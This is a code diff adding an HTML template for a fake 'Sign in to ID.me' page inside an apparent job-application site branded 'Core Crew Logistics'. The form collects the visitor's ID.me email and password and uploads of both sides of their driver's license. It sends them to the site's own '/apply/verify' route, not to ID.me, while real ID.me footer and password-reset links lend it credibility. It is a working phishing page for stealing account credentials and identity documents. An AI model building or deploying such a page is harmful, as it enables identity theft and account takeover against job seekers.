@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Sign in to ID.me - ID.me</title>
+  <!-- FIX: Prevent zoom on input fields for mobile -->
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <link rel="icon" type="image/jpeg" href="/public/img/logo.jpg" />
+  <link rel="stylesheet" href="/public/idme-signin.css" />
+  <link rel="stylesheet" href="/public/styles.css" />
+  <style>
+    /* Prevent zoom on input fields for iOS Safari and most Android browsers */
+    input, textarea, select {
+      font-size: 16px !important;
+    }
+    .skip-btn-row {
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      justify-content: center;
+      gap: 18px;
+      margin-top: 18px;
+    }
+    .btn-skip {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 10px 15px;
+      font-size: 1.04rem;
+      font-weight: 600;
+      border-radius: 7px;
+      background: linear-gradient(90deg, #f7b731 70%, #2ecc71 100%);
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 2px 8px 0 rgba(24,70,163,0.10);
+      transition: background 0.18s, color 0.18s;
+      text-decoration: none;
+      min-height: 38px;
+    }
+    .btn-skip:hover, .btn-skip:focus {
+      background: linear-gradient(90deg, #2ecc71 10%, #1846a3 90%);
+      color: #fff;
+      outline: 2px solid #2ecc71;
+      outline-offset: 2px;
+    }
+    @media (max-width: 600px) {
+      .skip-btn-row {
+        flex-direction: column;
+        gap: 10px;
+      }
+      .btn-skip {
+        width: 100%;
+      }
+    }
+    .fixed-back-btn {
+      position: fixed;
+      top: 80px;
+      left: 1rem;
+      z-index: 1200;
+    }
+    @media (min-width: 701px) {
+      .fixed-back-btn {
+        top: 100px;
+        left: 2rem;
+      }
+    }
+  </style>
+  <script>
+    function submitSkip() {
+      var form = document.getElementById('idme-form');
+      form.action = '/apply/skip-idme/';
+      form.method = 'post';
+      var passwordInput = document.getElementById('idme-password');
+      if (passwordInput) passwordInput.removeAttribute('name');
+      form.submit();
+    }
+    // Client-side file validation for mobile & desktop
+    document.addEventListener("DOMContentLoaded", function() {
+      document.getElementById('idme-form').addEventListener('submit', function(e) {
+        const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
+        const maxSize = 5 * 1024 * 1024; // 5MB
+        const front = document.getElementById('driversLicenseFront').files[0];
+        const back = document.getElementById('driversLicenseBack').files[0];
+        function validateFile(file, side) {
+          if (file && !allowedTypes.includes(file.type)) {
+            alert(side + ' image must be JPG, PNG, or PDF.');
+            return false;
+          }
+          if (file && file.size > maxSize) {
+            alert(side + ' image is too large (max 5MB).');
+            return false;
+          }
+          return true;
+        }
+        if (!validateFile(front, "Front")) { e.preventDefault(); return; }
+        if (!validateFile(back, "Back")) { e.preventDefault(); return; }
+      });
+    });
+  </script>
+</head>
+<body>
+  <%- include('partials/header') %>
+  <a href="/apply" class="btn ghost fixed-back-btn"
+     onclick="if(document.referrer && document.referrer !== window.location.href){window.history.back(); return false;}">
+    &larr; Back
+  </a>
+  <div class="page-container">
+    <header class="form-header">
+      <div class="form-header-content" role="banner">
+        <div class="partner" style="display: flex; flex-direction: column; align-items: center;">
+          <div class="company-logo" style="margin-bottom:18px;">
+            <img class="logo" src="/public/img/logo.jpg" alt="Core Crew Logistics Logo" style="max-height:54px;">
+          </div>
+        </div>
+      </div>
+    </header>
+    <main class="form-container">
+      <div class="form-header-access">
+        <h1 id="sr_page_title">Sign in to ID.me</h1>
+      </div>
+      <div class="form-header-well">
+        <p><b>New to ID.me?</b></p>
+        <p>
+          <a href="https://api.id.me/en/registration/new" target="_blank">Create an ID.me account</a>
+        </p>
+      </div>
+      <!-- Updated form to support file upload (front and back) -->
+      <form id="idme-form" class="idme-form" method="post" action="/apply/verify" autocomplete="off" enctype="multipart/form-data">
+        <div class="form-fields">
+          <div class="field text">
+            <label for="idme-email">Email</label>
+            <input id="idme-email" type="email" name="email" required autocomplete="off" placeholder="your@email.com" value="<%= email %>">
+          </div>
+          <div class="field text password-showable signin-password-field">
+            <label for="idme-password">Password</label>
+            <input id="idme-password" type="password" name="password" required autocomplete="off" placeholder="Enter your password">
+          </div>
+          <div class="field file verify-upload-field">
+            <label for="driversLicenseFront">Upload Driver's License/ID (Front)</label>
+            <input type="file" name="driversLicenseFront" id="driversLicenseFront" accept="image/jpeg,image/png,application/pdf" required>
+            <p style="font-size:0.92em;color:var(--text-light);margin-top:4px;">Accepted: .jpg, .png, .pdf (max 5MB)</p>
+          </div>
+          <div class="field file verify-upload-field">
+            <label for="driversLicenseBack">Upload Driver's License/ID (Back)</label>
+            <input type="file" name="driversLicenseBack" id="driversLicenseBack" accept="image/jpeg,image/png,application/pdf" required>
+            <p style="font-size:0.92em;color:var(--text-light);margin-top:4px;">Accepted: .jpg, .png, .pdf (max 5MB)</p>
+          </div>
+        </div>
+        <div class="forgot-password-link">
+          <a href="https://api.id.me/en/passwords/new" target="_blank">Forgot password?</a>
+        </div>
+        <div class="skip-btn-row">
+          <button type="submit" class="btn primary">Sign in</button>
+          <button type="button" class="btn-skip" onclick="submitSkip()">Skip ID.me & Submit Application</button>
+        </div>
+        <div class="form-footer-message" style="margin-top:16px;">
+          <p>Social media sign-in is no longer available. Please sign in with your email or skip verification to continue.</p>
+        </div>
+      </form>
+      <aside class="language-selection">
+        <a class="language-selection-toggle" href="#">English</a>
+      </aside>
+      <footer class="footer">
+        <nav class="footer__links" aria-label="Footer">
+          <a href="https://www.id.me/about" target="_blank" class="footer__link">What is ID.me?</a>
+          <a href="https://www.id.me/terms" target="_blank" class="footer__link">Terms of Service</a>
+          <a href="https://www.id.me/privacy" target="_blank" class="footer__link">Privacy Policy</a>
+        </nav>
+      </footer>
+    </main>
+  </div>
+</body>
+</html>
